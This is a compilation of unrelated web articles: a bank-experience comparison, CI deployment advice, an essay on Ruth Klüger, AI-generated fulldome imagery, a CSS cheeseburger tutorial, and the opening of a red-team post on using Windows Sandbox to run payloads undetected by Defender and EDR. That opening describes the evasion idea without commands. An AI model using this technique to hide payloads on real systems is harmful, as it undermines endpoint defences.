		<p>If you trace the news in financial services (banking, insurance, etc.), it's hard not to be overly enthusiastic - the terms like <em>'digital disruption'</em>, <em>'fintech innovation'</em>, <em>'banking 3.0'</em>, <em>'blockchain-powered XYZ'</em>, <em>'transformative services'</em> are flying left and right in everyday announcements. Apparently, very conservative, highly regulated, traditional institutions are now in absolute avant-garde of user-focused, technological revolution, making Internet-era behemoths like Google, Microsoft, Amazon or Facebook pale in comparison.</p><p>Or maybe it's <u><strong>utter crap</strong></u>?</p><p>Cheap PR? Buzzword bingo? Painting the dead grass green? A modern equivalent of H.C.Andersen's <em>"The Emperor's New Clothes"</em>? Hmm, what could be the easiest way to verify that?</p><p>How about performing a ... <strong>time travel</strong>? I mean: going back in time 10-15 years and comparing what banks (or other financial institutions) provided THEN with what they do provide NOW. Because that's what really matters - making a difference from the customer's perspective by providing better customer experience, more valuable products and services, etc. Updating the visual style to look like material design ain't enough.</p><p>Time travel sounds like something beyond our capacity these days, but ... luckily I think can help here. In this particular case, I can really make it happen! How come?</p><p><em><a href="https://www.youtube.com/watch?v=tAVVy_x3Erg">Stay awhile and listen ...</a></em></p><p>In 2001 I've opened a bank account in a completely new bank which was (AFAIK - I'm not 100% sure here) the 1st true Internet bank (no physical branches, just the Internet access - you could do everything on-line, even opening the account) in Poland. It was named <a href="https://inteligo.pl/">Inteligo</a>, and you can read more about it <a href="https://en.wikipedia.org/wiki/Inteligo">here</a>. To be honest: those days it was a real game-changer (when compared to traditional banking with money transfers that required you to appear physically in the bank's branch or postal office ...).</p><p>But the very next year (in 2002) <strong>Inteligo</strong> was fully (100%) acquired by the largest bank in Poland - <strong>PKO BP</strong>. That institution was (and is) perceived as a very traditional one - aimed at retirees, elderly people - in general folks who are somewhat distrustful and reluctant to change. What a marriage, wasn't it?</p><p>Fast forward 18 years:</p><ul><li><strong>PKO BP</strong> didn't really "merge" with <strong>Inteligo</strong> at all - it's still a separate service (with a separate brand, pool of financial products, UI, etc.)</li><li>the development of <strong>Inteligo</strong>, which was unquestioningly one of the most innovative banks of its era, has ... pretty much ceased (except few meaningless details I'll cover later) - probably its owner didn't want to invest there and focused on its core e-banking offer (named <a href="https://www.ipko.pl/">'iPKO'</a>) instead; feel free to check the "evolution" of the infosite frontpage in <a href="https://web.archive.org/web/20010601000000*/inteligo.pl">web archive</a>.</li><li>the development of iPKO has progressed steadily (backed up with shitloads of investment) throughout all the past years, bringing the new versions of the web user interface, mobile apps, etc.</li><li>nevertheless, I didn't terminate my <strong>Inteligo</strong> account - I still use it mainly to pay the monthly bills, like a small "sash" just for that purpose</li></ul><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/12/header.png" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/12/header.png 600w, https://no-kill-switch.ghost.io/content/images/2020/12/header.png 800w" sizes="(min-width: 720px) 720px"><figcaption>Oh, those gradients, so 90-tish :)</figcaption></figure><p>You've probably figured it out already, but I'll state it explicitly - that situation provides me a unique opportunity <u>to compare a banking experience straight from 2002 with the one of the 2020 industry leader</u> (here in Poland). And answer the following questions:</p><ol><li>how much did the banks really progress in the past 18 years?</li><li>what is easier/better/more convenient from the end-user's perspective?</li><li>... or maybe some things have actually worsened?</li><li>did the changes introduced by banks change my behaviors when it comes to finances?</li></ol><p>I can't wait to dive into the details, so let's not delay any longer!</p><p>Let's expand the context on how I do banking, just a bit. My financial behavioral profile looks like that:</p><ul><li>I have both private and company (as an individual entrepreneur) accounts - in a few currencies (usual suspects like EUR or USD, none of the exotics)</li><li>I use both debit and credit cards</li><li>I have used both cash loans and the mortgage in the past</li><li>I've bought car insurance via the bank's partnership once</li><li>I don't use direct debit, its paperwork is freaking cumbersome - I prefer to set subscription-based, regular payments out of the bank</li><li>obviously, I do money transfers, domestic and international</li><li>I've used a few forms of savings, but no investments like stocks or derivatives</li><li>No installment purchases</li><li>I've requested few atypical operations in the past: like early repayments or rebinding mortgage to a different current account - but nothing really fancy</li></ul><p>I don't think I'd call myself a heavy financial instruments user, but probably I'm still above the average. On top of that, I'm a tech-savvy, heavyweight Internet user - I avoid both physical branch visits and call-centers (both phone and video-call versions) at all cost.</p><p>When it comes to banking, I generally prefer browser over mobile apps (exception: Revolut, because they have really good, laser-focused mobile apps). The reason is simple: when I'm browsing my savings or making a transfer, I'd like to have some privacy. In my case, privacy usually means having one of my laptops within a hand reach anyway, so ...</p><p><em>To be continued (next week)</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Continuous integration services like <a href="https://www.jenkins.io/">Jenkins</a>, <a href="https://bitbucket.org/product/features/pipelines">Bitbucket Pipelines</a>, <a href="https://circleci.com/">CircleCI</a>, <a href="https://github.com/features/actions">GitHub Actions</a>, <a href="https://docs.gitlab.com/ee/ci/">Gitlab CI/CD</a> force extreme automation. They require your continuous integration flows to run non-interactively in remote environments. Most of these tools do not allow you to interact with the continuous integration environment.</p>



<p>All of these tools require users to define deployment workflows in custom definition languages. It is very common in my experience that users of these services can <em>only</em> run their deployment workflows using the service in question.</p>



<p>When something goes wrong with a deployment, debugging takes the form of a <strong>deployment death loop</strong>:</p>



<ol><li>Make changes locally (mostly to continuous integration configuration files).</li><li>Push to the appropriate branch on your git host (usually <em>master</em>).</li><li>Wait for a job to start on your continuous integration service.</li><li>Wait minutes or even tens of minutes following the logs to see if your changes fixed the issue.</li><li>Repeat this procedure until you have solved the problem.</li></ol>



<p>Things are even worse when you have to debug configuration that lives in a database or on a configuration management system such as <a href="https://www.vaultproject.io/">Vault</a> or <a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-parameter-store.html">Parameter Store</a>. If you can’t manually trigger a workflow, you are forced to push superficial changes to your git repository (like adding punctuation or white space to your README) to see if your changes worked.</p>



<p>How to break out of this death loop?</p>



<p>Two suggestions:</p>



<p>First, <strong>any developer should be able to deploy from their local environment</strong> (provided they have the required level of access). The continuous integration workflow definition should be secondary to this mechanism. If possible, it should make use of this mechanism.</p>



<p>For example, at <a href="https://alpha.bugout.dev/">Bugout</a>, our services are deployed by a bash script which can be executed on our servers via SSH. Even in production, if a developer has access to the production servers, they can run a deployment by simply running a git pull and then the deployment script over SSH. This is useful not only when debugging deployments but also when our continuous integration service goes down, <a href="https://www.githubstatus.com/incidents/sxthxvdlljk4">which has been known to happen</a>.</p>



<p>Second, <strong>embrace </strong><a href="https://en.wikipedia.org/wiki/Checklist"><strong>checklists</strong></a>. Have a checklist of external actions that must be taken before a change can be deployed. This checklist can include things like running database migrations, setting environment variables, or modifying a load balancer.</p>



<p>It’s okay to check items off such a checklist manually. Manual checklists may invalidate ideas of fully automated deployments. This is alright. Deployments that require manual steps should be performed with human oversight.</p>



<p>The general principle is to <strong>favor interactivity over automation</strong>. Make your deployments interactive by default. You will not regret it.</p>

<p>Last month saw the passing of Ruth Klüger, one of the most influential memoirists of the Holocaust, at age 88. Born to a Jewish family in Vienna in 1931, Klüger was deported to Theresienstadt with her family shortly before her eleventh birthday then transferred to Auschwitz and a women’s subcamp of Gross-Rosen concentration camp. She survived Auschwitz by lying about her age, after a female clerk told her to say she was 15 when she was only 12 order to be transferred for work in a labor camp. In her memoir, Klüger presents this moment, to which she owed her life, as neither heroic, nor redemptive, but human. “What more do you need for an example of perfect goodness?” (<em>Still Alive</em>,108). Klüger and her mother ultimately survived by escaping from a death march. Her brother and father were murdered. After the war Klüger studied in Regensburg and then in 1947 emigrated with her mother to the United States, where she graduated from Hunter College and went on to earn a Ph.D. in from Berkeley. She became a professor of German literature and taught at a number of universities, including Princeton (where she became the first female full professor of German) and the University of California, Irvine.</p>



<p>At Irvine, Klüger oversaw a study abroad program in Göttingen, Germany, where she was struck by a bicycle in 1989. As she emerged from a days-long coma, she began to recall long-repressed memories and began to write. As <a href="https://www.jstor.org/stable/10.5749/j.ctttv6p4.9">Michael Rothberg</a> writes, “In her reconstruction of her thoughts as the bicyclist bore down on her, the bicycle and headlight are transformed into barbed wire and a spotlight” (130). Klüger’s memoir, <em>Weiter Leben</em>, published in German in 1992 (“German, strange as this statement may sound, is a Jewish language” (<em>Still Alive</em>, 205)), when she was 70, was a bestseller and won major awards. It can be said to exemplify what Freud called <a href="https://doi.org/10.1177/0959354314530812"><em>Nachträglichkeit</em>, trauma delayed</a>. <a href="https://www.jstor.org/stable/10.5749/j.ctttv6p4.9">Rothberg</a> praised her memoir for depicting “a site of extreme violence as a borderland of extremity and everydayness” and described it as a model of a literary mode he termed “traumatic realism,” which breaks through deadlock between “realist” versus “antirealist” Holocaust representation (109).The English version, <em>Still Alive</em>,was published in 2001. The book is widely taught in university courses and is used as an eyewitness testimony in major works of Holocaust historiography including Saul Friedländer’s <a href="https://www.harpercollins.com/products/nazi-germany-and-the-jews-saul-friedlander"><em>Nazi Germany and the Jews</em></a>(1997/2007) and Peter Fritzsche’s <a href="https://books.google.com/books?id=nIUFQGN2y4EC&amp;printsec=frontcover&amp;source=gbs_ge_summary_r&amp;cad=0#v=onepage&amp;q&amp;f=false"><em>Life and Death in the Third Reich</em></a>(2008).</p>

<p>Klüger stands out among survivors for her outspoken critical stance toward Holocaust remembrance culture. She <a href="https://www.jstor.org/stable/43555106">once said to the German Studies Association</a>, “the present memorial cult that seeks to inflict certain aspects of history and their presumed lessons on our children, with its favorite mantra, ‘Let us remember, so the same thing doesn’t happen again,’ is unconvincing. To be sure, a remembered massacre may serve as a deterrent, but it may also serve as a model for the next massacre” (GSA, 392). She called out Holocaust tourism, asking what the “carefully tended, unlovely remains” of former concentration camps could possibly communicate of the experience of being imprisoned there (<em>Still Alive</em>, 63). “I don’t go to these concentration camp memorial sites,” she once flatly told <a href="https://www.spiegel.de/international/holocaust-survivor-ruth-klueger-vienna-reeks-of-anti-semitism-a-435879.html"><em>Der Spiegel</em></a>, and she even asked the Auschwitz Museum to take down her poems, which were displayed there against her wishes (111). “I don’t hail from Auschwitz, I come from Vienna,” she wrote, and it seems that this attitude led her to <a href="https://www.dw.com/en/holocaust-survivor-and-author-ruth-kl%C3%BCger-dies-at-88/a-55188986">opt</a> to have the number tattooed on her arm removed in later life (112). She remained especially critical of German attempts to identify with victims from the Nazi era. “Defeat,” she reflected, “bred its own variants of nationalism”—a kind of <a href="https://books.google.com/books?id=eATtDwAAQBAJ&amp;pg=PT416&amp;lpg=PT416&amp;dq=%22negative+exceptionalism%22+rabinbach&amp;source=bl&amp;ots=pF_fBLAbO7&amp;sig=ACfU3U39FqK-RnvEvVtrDkPULc064HmiFg&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwjgmt-RnpztAhXmGVkFHd6mCN0Q6AEwAXoECAEQAg#v=onepage&amp;q=%22negative%20exceptionalism%22%20rabinbach&amp;f=false">negative exceptionalism</a> about German crimes (163).</p>



<p>Writing in the wake of popular milestones like <em>Holocaust </em>(1978) and <em>Schindler’s List </em>(1993), &nbsp;Klüger echoed critics of <a href="https://www.tandfonline.com/doi/abs/10.1080/14623529908413937">“the Americanization of the Holocaust”</a> and <a href="https://www.jstor.org/stable/j.ctt16gzj0m">“the end of the Holocaust,”</a> for whom brutal historical reality was displaced by redemptive and enjoyable kitsch. The problem of this oxymoronic “Holocaust aesthetics” became apparent to Klüger after a young woman approached her at a book signing and said, with a smile, “<em>I love the Holocaust</em>.” Klüger was taken aback. She understood that the woman loved not the event itself, but reading about it. “But her naïve and undisguised pleasure brought up the question: Should she love to read about the Holocaust? <em>Should</em> we in any shape or form feel positive and empowered or cathartically purged when we contemplate the extinction of a people? My impulse was to say to this woman: You shouldn’t. Stop reading these books, including mine, if you enjoy them” (GSA, 393).</p>



<p>This anecdote, Klüger reflects, validates continued discussion of Theodor Adorno’s famous <a href="https://books.google.com/books?id=f1y_dX04yBgC&amp;lpg=PP1&amp;pg=PA34#v=onepage&amp;q&amp;f=false">claim</a> that to write poetry after Auschwitz is barbaric, however much one may <a href="https://www.jstor.org/stable/488568">disagree with it</a>. She worried about <a href="https://www.jstor.org/stable/43555106">Holocaust literature slipping into “kitsch”</a>&nbsp; and reflected about the popularity of Anne Frank’s diary, “it is easier to shed tears over an unfortunate little girl than to agree or disagree with an eminently rational Italian chemist with pronounced opinions that was Primo Levi” (GSA, 400). Telling are the two other survivor authors she praises: the Hungarian Imre Kertész, who reflected on the paradox that once the Holocaust is written about, experience is substituted by the “artefact” of narrative representation, and who was also critical of <a href="https://books.google.com/books?id=toS1uAAACAAJ&amp;dq=The+Holocaust+as+Culture+Thomas,+Kert%C3%A9sz,+Imre&amp;hl=en&amp;newbks=1&amp;newbks_redir=0&amp;sa=X&amp;ved=2ahUKEwjlsqPEpprtAhUaRTABHVy6AqUQ6AEwAHoECAAQAg">“Holocaust culture.”</a> She also names the Polish writer Tadeusz Borwoski, whose acerbic <a href="https://en.wikipedia.org/wiki/This_Way_for_the_Gas,_Ladies_and_Gentlemen"><em>This Way to the Gas, Ladies and Gentlemen</em></a>(1946) she criticizes for its antisemitism and fictional embellishments, while also recognizing “the starkness with which Borowski portrays the slide from indifference to depravity at the edge of human existence and endurance” (GSA, 402).</p>



<p><em>Still Alive </em>is also notable for its “feminist” discussions of <a href="https://www.journals.uchicago.edu/doi/full/10.1086/668607">nonconsensual sex work</a> in the camps that debunked popular “whorehouse fantasies” and “a thriving cottage industry” of Holocaust-themed pornography (184), while also problematizing Holocaust “photos as an instrument of sublimated voyeurism” (159). But <em>Still Alive</em> stands out most for its <a href="https://press.uchicago.edu/ucp/books/book/chicago/T/bo25956860.html">bitter tone</a>. A reviewer <a href="https://www.nytimes.com/2020/10/16/us/ruth-kluger-dies.html">wrote</a> thatKlüger “unsentimentally redefined the conventional mythos of the heroic Holocaust survivor,” and indeed, she <a href="https://www.washingtonpost.com/local/obituaries/ruth-kluger-author-of-searing-and-celebrated-holocaust-memoir-dies-at-88/2020/10/09/eeee3b16-0a2a-11eb-9be6-cf25fb429f1a_story.html">rejected</a> the idea that suffering united victims as “sentimental rubbish.” Instead she <a href="https://www.washingtonpost.com/local/obituaries/ruth-kluger-author-of-searing-and-celebrated-holocaust-memoir-dies-at-88/2020/10/09/eeee3b16-0a2a-11eb-9be6-cf25fb429f1a_story.html">challenged her readers</a> to “rearrange a lot of furniture in their inner museum of the Holocaust,” <a href="https://www.dw.com/en/holocaust-survivor-ruth-kl%C3%BCger-germany-has-changed/a-19005242">reminding</a> them that “Surviving was not normal. Death was normal.” As the <a href="https://www.wienerzeitung.at/nachrichten/kultur/literatur/2077830-Autorin-Ruth-Klueger-gestorben.html"><em>Wiener Zeitung</em></a> fittingly titled their obituary, Klüger modeled “surviving relentlessly.”</p>



<p>As Klüger’s former colleague <a href="https://www.cbc.ca/radio/asithappens/as-it-happens-tuesday-edition-1.5769434/holocaust-survivor-ruth-kluger-would-not-accept-inequality-says-friend-1.5769532">Gail Hart reflects</a>, “I think she was a little bit too hard on those who, say, visited Holocaust memorials and Holocaust museums because she said that, you know, they were trying to admire themselves for hating the Nazis.” In <em>Still Alive </em>(as once <a href="https://www.lrb.co.uk/the-paper/v37/n03/slavoj-zizek/in-the-grey-zone">quoted by Slavoj Žižek</a>), Klüger recounts a conversation with German graduate students in Göttingen:</p>



<blockquote><p>One reports how in Jerusalem he made the acquaintance of an old Hungarian Jew who was a survivor of Auschwitz, and yet this man cursed the Arabs and held them all in contempt. How can someone who comes from Auschwitz talk like that? the German asks. I get into the act and argue, perhaps more hotly than need be. What did he expect? Auschwitz was no instructional institution…You learned nothing there, and least of all humanity and tolerance. Absolutely nothing good came out of the concentration camps, I hear myself saying, with my voice rising, and [the student] expects catharsis, purgation, the sort of thing you go to the theatre for? They were the most useless, pointless establishments imaginable. That is the one thing to remember about them if you know nothing else. (<em>Still Alive, </em>65)</p></blockquote>



<p>Klüger refuses to cast herself as a saint on account of her experience (unlike the <a href="https://time.com/4392426/ronald-lauder-elie-wiesel-holocaust/">canonized</a> but also <a href="https://www.tikkun.org/a-variety-of-perspectives-on-elie-wiesel">criticized</a> figure of Elie Wiesel). On the contrary, she even recounts a disturbing incident from the postwar years, while she waited in vain for her father and brother to return from the camps, in which she accidentally killed a little dog by forgetting to turn off the gas in the kitchen where he slept. “Of course I was mortified the next morning when I found his lifeless body and was despondent for days. Accident or symptom? And if the latter, symptom of what?” (<em>Still Alive</em>, 158). This fundamental recognition of moral fallibility led fellow Auschwitz survivor Primo Levi to coin the term “the grey zone” to describe how the camps generated <em>amorality</em>, not morality among victims. Yet while Levi similarly characterized Auschwitz as a <a href="https://books.google.com/books/about/The_Black_Hole_of_Auschwitz.html?id=VxbSTfGI638C">“Black Hole,”</a> he also, in sharp contrast to Klüger, called it his <a href="https://books.google.com/books?id=Kf3FAAAAQBAJ&amp;pg=PA34&amp;dq=%E2%80%9CAuschwitz+had+been+his+true+university.%E2%80%9D&amp;hl=en&amp;newbks=1&amp;newbks_redir=0&amp;sa=X&amp;ved=2ahUKEwi7mdLrkpztAhWhFVkFHVRWCmYQ6AEwAHoECAAQAg#v=onepage&amp;q=%E2%80%9CAuschwitz%20had%20been%20his%20true%20university.%E2%80%9D&amp;f=false">“true university”</a> for understanding human nature.</p>



<p><a href="https://www.nybooks.com/articles/2002/11/07/surviving/">Gabriele Annan</a> spoke for many when she called Klüger “merciless” and “outspoken to the point of aggressiveness”: “She also resents all views on the Holocaust that do not tally exactly with her own, and gets indignant about everyone who criticizes her….Levi told a similar story without making one feel so hectored.” <a href="https://www.bundestag.de/en/documents/textarchive/speech-klueger-403862">Speaking</a> before Angela Merkel and the German Bundestag on Holocaust Remembrance Day in 2016, Klüger <a href="https://www.bundestag.de/en/documents/textarchive/speech-klueger-403862">called</a> her own approach “bitter and aggressive,” yet also positively connected her experience with the plight of other groups, praising the “heroic” act of welcoming refugees from war-torn Syria. (She similarly <a href="https://www.cbc.ca/radio/asithappens/as-it-happens-tuesday-edition-1.5769434/holocaust-survivor-ruth-kluger-would-not-accept-inequality-says-friend-1.5769532">opposed</a> inhumane treatment of asylum-seekers at the U.S.–Mexico border.) Hart, her former colleague, reflects of Klüger, “She is a very direct interrogator. She doesn’t have any of these conciliatory mechanisms that most women have. And she seeks argument. And at first I found that a little bit off-putting and I kind of avoided her.” As Klüger admitted herself, “Damn right. I <em>am</em> hard to satisfy” (<em>Still Alive</em>, 184).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="news-content-html">
		    <div id="fddb_field_content"><p>In recent times the use of artificial intelligence, machine learning, GAN's and algorithms in artistic applications has been on the rise. There are many AI tools available today to assist creators at various points in the production process, whether it's streamlining normally tedious tasks with precision, or generating completely new stunning pieces of digital art.</p>
<p>Our question:&nbsp; <strong>Can AI generate 360° images&nbsp;</strong><strong>formatted for fulldome?</strong> (domemasters)</p>
<p>Our answer:&nbsp; <strong>Yes!&nbsp;</strong>&nbsp;(..kind of)</p>
<p>Tools/software: <strong>Kodak SP3604K, Runway ML, StyleGAN2 on Google Colab.&nbsp;&nbsp;</strong></p>
<p>Machine learning is an area of research within the field of artificial intelligence (AI). For this experiment, we used <a href="https://runwayml.com/">RunwayML</a>, a platform for training your own models. The term model refers to the result of training a machine learning algorithm with a dataset. A machine learning algorithm find patterns within the data and develops its own rules for how to represent—or model—those patterns to perform a specific task. These rules are not designed by humans; they are learned from the data on which the model was trained.</p>
<p>People build models in different programming languages, with different frameworks, and for different purposes, such as to recognize spam email, classify objects, edit images and video, and capture motion. <strong>In our case</strong>, <strong><em>we want to train a model that generates images of architectural facades that respect the geometric attributes and perspective of the domemaster format.</em></strong></p>
<p>Here are the results:&nbsp;<strong>AI urban environments, domemaster below.&nbsp;</strong></p>
<p><iframe src="https://www.youtube.com/embed/A9Sa4ADKgZs" frameborder="0" width="560" height="315" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>We rendered 20+ minutes of fully AI-generated, morphing 360° urban environments with some interesting results:</p>
<ul>
<li>the geometry works!&nbsp;</li>
<li>the perspective works!</li>
<li>our AI domemaster has 230°+ fov since our dataset was shot with the SP3604K</li>
<li>full flexibility of latent walk render, speed and frames using StyleGAN2 in Colab (tutorial below)</li>
<li><em>limitation</em>: training resolution at 512x512 or 1024x1024 means rendered images must be upscaled before being usable in the dome (topaz AI gigapixel worked well).&nbsp; This can create unwanted artifacts in the image.</li>
</ul>
<p><strong>So how is this possible?</strong></p>
<p><strong>First step:</strong> We need an image dataset.&nbsp; We created an image dataset of 3000 fisheye images shot in downtown Montreal which we used to train our AI model.&nbsp;RunwayML makes training very easy: all you need to do is supply your own dataset and determine the number of steps that the algorithm should take to learn the features. During each step, the model learns a little bit more about the features in your dataset.</p>
<p>The time it takes to train a model depends on a combination of many factors, including but not limited to the type of machine learning algorithm (there are algorithms of varying complexity for working with images, words, or sounds) and the number of training steps.</p>
<p>RunwayML greatly reduces the amount of time needed to train your own generative image model by using using a technique called&nbsp;<a href="https://en.wikipedia.org/wiki/Transfer_learning" target="_blank" rel="noopener noreferrer">Transfer Learning</a>. With this technique, an existing pre-trained model called&nbsp;<a href="https://open-app.runwayml.com/?model=runway/StyleGAN" target="_blank" rel="noopener noreferrer">StyleGAN</a>&nbsp;is retrained on your dataset. StyleGAN was trained on a massive amount of images (70,000!), and Transfer Learning leverages all of the&nbsp;<a href="https://en.wikipedia.org/wiki/Feature_(computer_vision)" target="_blank" rel="noopener noreferrer">image features</a>&nbsp;it learned from the original data to speed up the process of learning features in your image dataset. Not only does this greatly reduce training time, but it also reduces the number of images that you need to train your own model.&nbsp;</p>
<p><strong><span>Training steps progress animation:</span></strong></p>

<p><strong>Second step:&nbsp;</strong>After a few hours our model has finished training, great!&nbsp; During training, your model learns to produce new images that look like the ones in your dataset. When training is complete, the model will generate a seemingly infinite number of synthetic images that appear as if they came from the dataset itself. The space of all-new possible images that your model can create is called the <em>latent space</em>, which you can explore when you run your model. RunwayML allows you to run the model directly in its UI (at a cost), or to download the model as a <strong>.pkl.&nbsp;&nbsp;</strong>Training already comes at a cost, and we want the flexibility of exploring the latent space ourselves, so we download the model and run it remotely on Google Colab with StyleGan2.&nbsp; The following tutorial explains the exact workflow with links in the description.</p>

<p><strong>Conclusion:</strong> Promising results for artists wishing to explore the possibilities of AI-generated 360° environments in the dome.&nbsp;&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

        <div>
            
<p>I enjoy challenging myself on some weird programming ideas. It's a good way to have fun and to learn new things. This time the challenge was to draw a cheeseburger in CSS using a single empty div.</p>
<p>After a lot of trials and errors, I ended up with this.</p>
<p><img src="https://www.lesscake.com/tutimg/5/6.png" alt=""></p>
<p>That's probably not the best looking burger ever. However I've been super impressed that it was actually possible to draw something as complex as this with a single div.</p>
<p>In this article we are going to make this cheeseburger, step by step. </p>
<h2>The HTML</h2>
<p>The HTML is very short: a charset, a title, a link to the CSS file, and a single div. </p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Cheesburger&lt;/title&gt;
    &lt;link rel="stylesheet" href="style.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="burger"&gt;&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>That's it! Now we will focus our attention on the style.css file. </p>
<h2>The CSS</h2>
<p>The most basic CSS for our burger may look like this.</p>
<pre><code>.burger {
  /* Contains all the parts of the burger */
  /* Bun, cheese, meat, lettuce, and sesame seeds */
}</code></pre>
<p>But that's too limited, we won't be able to fit a whole burger inside a single selector. To find more space, we should use the <code>:before</code> and <code>:after</code> pseudo elements. </p>
<pre><code>.burger {
  /* The cheese, meat, and lettuce */
}

.burger:before {
  /* The bun */
}

.burger:after {
  /* The sesame seeds */
}</code></pre>
<p>That might not seem much, but that will be enough for our purpose. </p>
<h2>The bun</h2>
<p>The bun is made of 2 parts: the top bun and the bottom bun. So we have to find a way to draw 2 different shapes in a single CSS selector, which is not that complicated.</p>
<p>We start by drawing 2 rectangles using the <code>border</code> property. </p>
<pre><code>.burger:before {
  content: ""; 
  display: block;

  /* Space between the buns */
  width: 400px;
  height: 55px;

  /* Top bun */
  border-top: 80px solid #f5b230;

  /* Bottom bun */
  border-bottom: 50px solid #f5b230;
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/1.png" alt=""></p>
<p>Then we use <code>border-radius</code> to curve the bread nicely.</p>
<pre><code>.burger:before {
  /* Same code as previously */
  content: ""; 
  display: block;
  width: 400px;
  height: 55px;
  border-top: 80px solid #f5b230;
  border-bottom: 50px solid #f5b230;

  /* New line */
  border-radius: 30% 30% 20% 20%; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/2.png" alt=""></p>
<h2>The ingredients</h2>
<p>Next, we will add the main burger ingredients: cheese, meat, and lettuce. This time it's 3 shapes that we have to fit in a single CSS selector. </p>
<p>Let's focus on the meat for now.</p>
<pre><code>.burger {
  /* Size */
  width: 380px;
  height: 40px;

  /* Color and shape */
  background-color: #681f24;
  border-radius: 15px; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/2a.png" alt=""></p>
<p>Well, that's not great. We have some meat, but it's not in the correct position. Unfortunately we can't use <code>margin</code> or <code>padding</code> to fix that, since it would move the whole burger and not just the steak.</p>
<p>Let's try something different: drawing the meat with a <code>box-shadow</code>.</p>
<pre><code>.burger {
  /* Same as previously */
  /* We just removed the background color */
  width: 380px;
  height: 40px;
  border-radius: 15px;

  /* New line */ 
  /* The parameters: margin-left, margin-top, color */
  box-shadow: 10px 85px #681f24; 
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/3.png" alt=""></p>
<p>That works! However we face another issue: how can we  add the cheese and the lettuce in the same CSS selector? To answer that we need to realize 2 things:</p>
<ul>
<li>The meat, the cheese, and the lettuce may have the same shape as long as their color is different.</li>
<li>In CSS it's possible to use as many box shadows as we want.</li>
</ul>
<p>So... we simply add more box shadows! </p>
<pre><code>.burger {
  /* Same code as before */
  width: 380px;
  height: 40px;
  border-radius: 15px; 

  /* Updated box shadow */
  box-shadow: 
      10px 50px #fddb28, /* Cheese */
      10px 85px #681f24, /* Meat */
      10px 120px #82af15; /* Lettuce */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/4.png" alt=""></p>
<p>Note that the shadows' order is important, since the first one will have a higher z-index and will appear in front of the others. </p>
<h2>The sesame seeds</h2>
<p>Our burger is taking shape, but it currently looks a lot like a hot dog. We should fix that by adding some sesame seeds to the top bun. </p>
<p>First we draw a single sesame seed with a <code>box-shadow</code>.</p>
<pre><code>.burger:after {
  content: "";
  display: block;

  /* Size and shape */
  width: 10px;
  height: 6px;
  border-radius: 40%;

  /* Position and color */
  box-shadow: 100px -165px #ffffff;
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/5b.png" alt=""></p>
<p>Then we duplicate it by using many box shadows.</p>
<pre><code>.burger:after {
  /* Keep same code as before */
  content: "";
  display: block;
  width: 10px;
  height: 6px;
  border-radius: 40%;

  /* Add new box-shadow */
  box-shadow: 
      /* Top row */
      100px -165px #ffffff,
      160px -165px #ffffff,
      230px -165px #ffffff,
      290px -165px #ffffff,

      /* Bottom row */
      60px -135px #ffffff,
      125px -135px #ffffff,
      190px -135px #ffffff,
      255px -135px #ffffff,
      330px -135px #ffffff;
}</code></pre>

<h2>Better cheese</h2>
<p>It would be nice if we could make our cheese look more like cheese. For example by showing one of the corners of the cheese slice. This means drawing a new shape (a yellow triangle) even though we already use all our CSS selectors.</p>
<p>If we look carefully at our code, we will notice that there's one thing we haven't really used so far: the <code>content</code> property. Let's see what happens when we add the character <code>▾</code> in it.</p>
<pre><code>.burger:before {
  /* Change the content property */
  content: "▾";

  /* Color and Size of the ▾ */
  color: #fddb28;
  font-size: 120px;

  /* Then keep everything else the same */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/5c.png" alt=""></p>
<p>We do get a new shape displayed, but it's in the wrong position. And once again we cannot use <code>margin</code> or <code>padding</code> to solve that. </p>
<p>But with some CSS tricks, we will make this work. </p>
<pre><code>.burger:before {
  /* Add 8 spaces before the triangle */
  content: "        ▾";

  /* Actually display the spaces in the "content" */ 
  white-space: pre;

  /* Vertically position the ▾ */
  line-height: 25px;

  /* Then keep everything the same */
}</code></pre>
<p><img src="https://www.lesscake.com/tutimg/5/6.png" alt=""></p>
<p>And we finished our cheeseburger!</p>
<h2>Bonus</h2>
<p>When emailing a friend about my challenge, she replied with this clever answer.</p>
<pre><code>.burger:before {
  content: "🍔";
  font-size: 100px;
}</code></pre>
<p>That's a lot less CSS for a better looking result. </p>
<h2>Conclusion</h2>
<p>I'm really impressed with what I managed to achieve with a single div and some CSS. Of course using SVG would have made more sense, but where's the fun in that?</p>

<p>Weaponizing Windows Sandbox To Bypass Defender</p>
<p><a href="">●</a> 02 Dec 2020</p>

<h2 id="introduction">Introduction</h2>
<p>I’ve not posted on here since May, as I’ve been busy with (well, life in general) projects and whatnot. This short blog post may be useful for a Red Team by living-of-the-land for the execution of payloads on a machine where Windows Sandbox can be enabled; Windows Sandbox is designed to work this way - no exploitation of anything is covered in this post. With this technique in terms of executing within a VM, we don’t need to load an external ISO onto the machine, as all of this is handled by the sandbox. From my visibility, <code>.wsb</code> was not inspected or blacklisted on any major EDR or AV.</p>
<p>At the tail end of last year, Microsoft introduced a new feature named Windows Sandbox (WSB for short). Windows Sandbox allows you to quickly, within 15s, create a disposable Hyper-V based Virtual Machine with all of the qualities a familiar VM would have such as clipboard sharing, mapping directories etc. The sandbox is also the underlay for Microsoft Defender Application Guard (WDAG), for dynamic analysis on Hyper-V enabled hosts and can be enabled on any Windows 10 Pro or Enterprise machine - making this a perfect as a living off the land technique.</p>
